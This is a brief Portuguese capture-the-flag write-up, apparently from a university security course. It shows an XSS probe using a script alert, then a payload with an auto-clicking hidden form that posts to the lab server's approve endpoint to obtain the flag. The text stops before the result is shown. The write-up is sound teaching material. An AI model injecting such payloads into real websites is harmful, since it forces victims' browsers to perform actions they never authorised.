Para realizar este ctf, teremos de trabalhar a partir desta página:

![Alt text](image.png)

A partir dessa página, apercebemo-nos que poderíamos testar se input que aí pediam era filtrado ou não. Para testar essa condição, decidimos criar uma função `alert()`, da seguinte maneira:

```
<script>alert("Teste");</script>
```

Obtendo este resultado:

![Alt text](image-5.png)

A seguir, colocamos este script...

```
<form method="POST" action="http://ctf-fsi.fe.up.pt:5005/request/%7Binserir ID do pedido}/approve" role="form"><div class="submit">  <input type="submit" id="giveflag" value="Give the flag"></div></form><script>document.getElementById("giveflag").click();</script>
```

...no input da página e submetemos assim.

O resultado que nos dará será este:


